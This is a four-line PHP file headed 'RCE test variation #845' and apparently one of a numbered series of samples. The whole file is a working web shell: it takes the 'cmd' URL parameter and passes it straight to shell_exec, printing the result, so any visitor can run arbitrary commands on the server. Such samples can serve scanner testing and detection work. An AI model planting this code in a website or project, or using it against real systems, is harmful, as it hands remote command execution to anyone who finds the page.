<?php
// RCE test variation #845
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>